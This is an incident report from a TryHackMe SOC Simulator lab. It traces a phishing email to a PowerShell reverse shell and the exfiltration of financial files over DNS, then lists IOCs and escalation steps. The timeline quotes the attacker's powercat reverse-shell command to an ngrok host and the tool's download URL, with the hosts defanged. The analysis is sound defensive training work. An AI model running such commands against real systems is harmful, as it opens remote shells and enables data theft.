# Incident Report: win-3450, Phishing to Data Exfiltration

**Source:** TryHackMe SOC Simulator (lab data) | **Tools:** Splunk | **Date of activity:** Nov 9, 2026

| Field | Value |
|---|---|
| Verdict | **True positive, critical** |
| Escalation | **Required** (L2 / incident response) |
| Host | `win-3450` |
| User | `SSF\michael.ascot` (`michael.ascot@tryhatme[.]com`) |
| Data at risk | `\\FILESRV-01\SSF-FinancialRecords` |
| Related alerts | 1005, 1006, 1022, 1024, 1025 to 1034 |

## Summary

User `michael.ascot` received a phishing email with a ZIP "invoice" (alert 1005). A PowerShell reverse shell (powercat to an ngrok address) followed, then discovery commands. The `SSF-FinancialRecords` share was mapped, copied into a local `exfiltration` folder, and sent out as encoded DNS queries to `haz4rdw4re[.]io` (alerts 1022, 1024, 1025 to 1034).

The alerts are one incident: same host, same parent PowerShell process (PID 3728). No firewall or DNS logs were available, so I could not confirm that the data reached the attacker.

## Escalation

Reasons:
- Interactive attacker session on a user account.
- Financial records, client portfolio and investor files involved, which may need legal or breach-notification decisions.
- Scope unknown: other hosts, mailboxes, credentials and the file server need L2 or IR review.

Actions requested:
- Isolate `win-3450`.
- Disable `michael.ascot` and reset credentials.
- Review `FILESRV-01` access logs.
- Block `hatmakereurope[.]xyz`, `haz4rdw4re[.]io` and the ngrok address.
- Remove the phishing email from mailboxes.
- Check whether the `exfiltration` folder contents left the host by any other route.
- Review the 14:30 email to `conor@yahoo[.]com`.
- Tell the owner of the financial records.

## Timeline (Splunk event times, Nov 9)

| Time | Event |
|---|---|
| 14:05 | Email with `ImportantInvoice-Febrary.zip` from `john@hatmakereurope[.]xyz` (alert 1005) |
| 14:06:20 | `rdpclip.exe` starts (alert 1006), remote desktop session on the host |
| 14:15:12 | `OUTLOOK.EXE /eml` opens `Important: Pending Invioce!.eml` from the user's profile |
| 14:25:27 | `powershell.exe` (parent `explorer.exe`) downloads `powercat.ps1` and runs `powercat -c 2[.]tcp[.]ngrok[.]io -p 19282 -e powershell` |
| 14:25:43 to 14:26:12 | `systeminfo`, `whoami`, `whoami /priv`, `net user`, `net localgroup` |
| 14:28:33 | `net use Z: \\FILESRV-01\SSF-FinancialRecords` (alert 1022) |
| 14:29:20 | `Robocopy.exe . C:\Users\michael.ascot\downloads\exfiltration /E` |
| 14:29:31 | `net use Z: /delete` (alert 1024) |
| 14:30:26 | Outbound email from `michael.ascot` to `conor@yahoo[.]com`, no attachment (relation not confirmed) |
| 14:31:56 to 14:32:12 | 10 `nslookup.exe` runs to `haz4rdw4re[.]io` (alerts 1025 to 1034) |

Alert timestamps differ from Splunk event times by a few seconds up to about 1.5 minutes. Splunk times are used here.

## Evidence

**Phishing email.** Unknown `.xyz` sender, threat of account suspension and legal action within 24 hours, generic text, ZIP attachment with a typo in the name.

![Alert 1005](Images/inc-01-alert-1005.png)
![Email search for michael.ascot](Images/inc-03-email-search.png)

**Execution.** PowerShell downloaded `powercat.ps1` from GitHub, ran it in memory and connected out to `2[.]tcp[.]ngrok[.]io` port 19282. The PowerShell log (user `SSF\michael.ascot`) shows the tool's message "Both Communication Streams Established".

![PowerShell log](Images/inc-04-powershell-log.png)

**Host activity.** Full command timeline for `win-3450`, showing discovery, share access, Robocopy and the DNS queries.

![Host command timeline](Images/inc-02-sysmon-timeline.png)

**Share access.** Share mapped as Z:, copied to `C:\Users\michael.ascot\downloads\exfiltration`, mapping removed.

![Alert 1022](Images/inc-05-alert-1022.png)
![Alert 1024](Images/inc-06-alert-1024.png)

**DNS exfiltration.** Ten `nslookup.exe` runs from PowerShell (PID 3728): eight at 14:31:56 and two 16 seconds later. Each query has a long encoded string before `haz4rdw4re[.]io`. A sample of the strings decodes to:
- `PK`, the header of a ZIP file
- file names `Summary.xlsx`, `ClientPortfolio...` and `InvestorPresen...tation...pptx`
- the last string ends with `==`, base64 padding

![DNS alert 1025](Images/inc-07-dns-alert-1025.png)
![Search for the exfiltration domain](Images/inc-08-dns-search.png)

Searches for `powercat`, `ngrok`, `haz4rdw4re` and `hatmakereurope` returned events from `win-3450` only.

## Related alerts

| Alert | Severity | Description |
|---|---|---|
| 1005 | Low | Suspicious attachment: `ImportantInvoice-Febrary.zip` |
| 1006 | Low | `rdpclip.exe` from `svchost.exe` (normal alone, marks the session) |
| 1022 | Medium | Network drive mapped: `\\FILESRV-01\SSF-FinancialRecords` |
| 1024 | Medium | Network drive disconnected: `Z:` |
| 1025 to 1034 | High | 10 x `nslookup.exe` with encoded subdomain, parent `powershell.exe` |

Not related: alert 1011 (low severity spam from `keane@modernmillinerygroup[.]online`, same recipient).

## Indicators

| Type | Value |
|---|---|
| Sender | `john@hatmakereurope[.]xyz` |
| Attachment | `ImportantInvoice-Febrary.zip` |
| Tool download | `hxxps://raw[.]githubusercontent[.]com/besimorhino/powercat/master/powercat[.]ps1` |
| Remote host | `2[.]tcp[.]ngrok[.]io:19282` |
| Exfiltration domain | `haz4rdw4re[.]io` |
| Staging folder | `C:\Users\michael.ascot\downloads\exfiltration` |
| Share | `\\FILESRV-01\SSF-FinancialRecords` |

## MITRE ATT&CK

T1566.001, T1204.002, T1059.001, T1105, T1033, T1082, T1087.001, T1069.001, T1021.002, T1039, T1074.001, T1560 (likely), T1048.003, T1070.005

## Not confirmed

- Whether the reverse shell connected and whether the DNS queries reached the attacker. Only `email`, `powershell` and `sysmon` logs were available, with no firewall or DNS data.

![Available datasources](Images/inc-09-datasources.png)

- How the ZIP was created. It is inferred from the decoded data.
- The link between the ZIP in alert 1005 and the `.eml` opened at 14:15. Likely, but not proven.
- Whether the 14:30 email to `conor@yahoo[.]com` is related.
